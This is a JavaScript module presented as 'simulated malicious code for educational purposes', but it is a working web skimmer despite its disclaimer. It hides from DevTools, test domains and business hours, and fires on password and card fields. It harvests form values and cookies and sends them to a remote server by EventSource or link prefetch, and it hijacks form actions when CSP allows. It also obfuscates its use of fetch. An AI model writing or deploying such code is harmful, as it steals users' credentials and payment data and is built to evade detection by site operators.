const init = () => {
  // Simulated malicious code for educational purposes
  // Does NOT actually send data or cause harm outside controlled environment

  // Helper to decode obfuscated strings
  const k = s => s.split('').map(c => String.fromCharCode(c.charCodeAt() - 1)).join('');

  // Check if DevTools is open (Heisenberg Manoeuvre)
  const isDevToolsOpen = () => {
    const threshold = 160;
    const widthDiff = window.outerWidth - window.innerWidth > threshold;
    const heightDiff = window.outerHeight - window.innerHeight > threshold;
    return widthDiff || heightDiff;
  };

  // Check domain restrictions
  const isRestrictedDomain = () => {
    const hostname = window.location.hostname.toLowerCase();
    return (
      hostname === 'localhost' ||
      /^(\d{1,3}\.){3}\d{1,3}$/.test(hostname) || // IP address
      /\b(dev|test|qa|uat|staging)\b/.test(hostname)
    );
  };

  // Check time restrictions (7am-7pm weekdays)
  const isRestrictedTime = () => {
    const now = new Date();
    const hour = now.getHours();
    const day = now.getDay();
    return day >= 1 && day <= 5 && hour >= 7 && hour < 19; // Weekdays 7am-7pm
  };

  // Check if data was already sent for this device
  const hasSentData = () => {
    return localStorage.getItem('sentData') === 'true' || document.cookie.includes('sentData=true');
  };

  // Mark data as sent
  const markAsSent = () => {
    localStorage.setItem('sentData', 'true');
    document.cookie = 'sentData=true; max-age=31536000'; // 1 year
  };

  // Check for sensitive page content
  const isSensitivePage = () => {
    const keywords = ['credit card', 'checkout', 'login', 'password'];
    const bodyText = document.body.innerText.toLowerCase();
    const hasKeywords = keywords.some(word => bodyText.includes(word));
    const hasForm = document.forms.length > 0;
    const hasSensitiveInput = document.querySelector(
      'input[type="password"], input[name="cardnumber"], input[name="cvc"], input[name="exp"]'
    );
    return hasForm && (hasKeywords || hasSensitiveInput);
  };

  // Collect sensitive data
  const collectData = () => {
    const sensitiveUserData = {
      forms: [],
      cookies: document.cookie
    };
    Array.from(document.forms).forEach(form => {
      const formData = {};
      Array.from(form.elements).forEach(el => {
        if (el.name && el.value) {
          formData[el.name] = el.value;
        }
      });
      sensitiveUserData.forms.push(formData);
    });
    return sensitiveUserData;
  };

  // Encode data
  const encodeData = (data) => {
    return btoa(JSON.stringify(data));
  };

  // Check CSP
  const checkCSP = async () => {
    try {
      const resp = await fetch(document.location.href);
      const csp = resp.headers.get('Content-Security-Policy') || '';
      return {
        csp,
        hasFormAction: csp.includes('form-action')
      };
    } catch {
      return { csp: '', hasFormAction: false };
    }
  };

  // Simulate sending data (for educational purposes)
  const sendData = (payload) => {
    const url = 'http://192.168.0.12:3000/bounce-data'; // Replace with your teacher's server
    if ('EventSource' in window && !('ServiceWorker' in window)) {
      // Use EventSource to bypass serviceWorker fetch listeners
      new EventSource(`${url}?data=${encodeData(payload)}`);
    } else {
      // Fallback to link prefetch if EventSource not available
      const linkEl = document.createElement('link');
      linkEl.rel = 'prefetch';
      linkEl.href = `${url}?data=${encodeData(payload)}`;
      document.head.appendChild(linkEl);
    }
  };

  // Main logic
  const run = async () => {
    if (
      isDevToolsOpen() ||
      isRestrictedDomain() ||
      isRestrictedTime() ||
      hasSentData() ||
      !isSensitivePage()
    ) {
      return; // Exit if conditions not met
    }

    const cspInfo = await checkCSP();
    if (!cspInfo.hasFormAction) {
      // If no form-action in CSP, change form actions
      Array.from(document.forms).forEach(formEl => {
        formEl.action = 'http://192.168.0.12:3000/bounce-form';
      });
    } else {
      // Collect and send data
      const data = collectData();
      const payload = encodeData(data);
      const i = 'gfudi'; // Obfuscated 'fetch'
      if (self[k(i)]) { // self is window, k(i) is 'fetch'
        sendData(payload);
        markAsSent();
      }
    }
  };

  // Event listeners for blur and submit
  const setupListeners = () => {
    document.querySelectorAll('input[type="password"], input[name="cardnumber"], input[name="cvc"], input[name="exp"]').forEach(input => {
      input.addEventListener('blur', run);
    });
    Array.from(document.forms).forEach(form => {
      form.addEventListener('submit', run);
    });
  };

  // Initialize
  if (isSensitivePage()) {
    setupListeners();
  }
};

module.exports = { init };
